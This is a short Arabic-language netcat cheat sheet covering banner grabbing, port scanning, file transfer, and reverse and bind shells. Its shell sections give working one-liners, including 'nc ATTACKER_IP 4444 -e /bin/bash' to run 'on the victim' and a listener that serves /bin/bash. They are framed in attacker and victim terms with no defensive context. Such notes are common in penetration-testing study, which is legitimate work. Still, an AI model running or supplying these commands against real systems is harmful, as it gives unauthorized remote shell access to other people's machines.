

# 1. Banner Grabbing 

مثال على FTP:

```
nc 192.168.1.10 21
```

قد يظهر:

```
220 vsFTPd 2.3.4
```



---

# 2. Port Scanning 

فحص بورت واحد:

```
nc -nv 192.168.1.10 80
```

إذا مفتوح:

```
Connection succeeded
```


إذا مغلق:

```
Connection refused
```

---

فحص مدى من البورتات:

```
nc -nvz 192.168.1.10 1-1000
```

معاني الخيارات:

|الخيار|المعنى|
|---|---|
|-z|Scan Only|
|-v|Verbose|

# 3. File Transfer 

من أكثر الأشياء استخدامًا.


## على الجهاز المستقبل

```
nc -lvnp 4444 > file.txt
```

## على الجهاز المرسل

```
nc 192.168.1.5 4444 < file.txt
```



---

# 4. Reverse Shell 



## على جهاز المهاجم

```
nc -lvnp 4444
```

## على الضحية

```
nc ATTACKER_IP 4444 -e /bin/bash
```


---

# 5. Bind Shell

العكس تمامًا.


على الضحية:

```
nc -lvnp 4444 -e /bin/bash
```

على المهاجم:

```
nc TARGET_IP 4444
```


هنا المهاجم هو الذي يتصل.
